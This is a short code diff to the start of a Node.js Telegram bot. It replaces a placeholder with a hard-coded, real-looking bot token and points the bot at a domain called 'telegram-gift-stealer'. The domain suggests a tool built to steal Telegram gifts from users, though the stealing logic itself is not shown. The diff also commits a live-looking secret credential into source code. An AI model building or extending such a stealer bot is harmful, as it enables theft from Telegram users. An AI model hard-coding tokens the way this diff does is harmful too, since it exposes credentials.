@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 
-const TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TOKEN = '8280258891:AAE8C_T4mCmS7r4KgowSuekb6z2IG6_6cBY';
 const DOMAIN = 'https://telegram-gift-stealer.vercel.app';
 
 const bot = new TelegramBot(TOKEN, {polling: true});
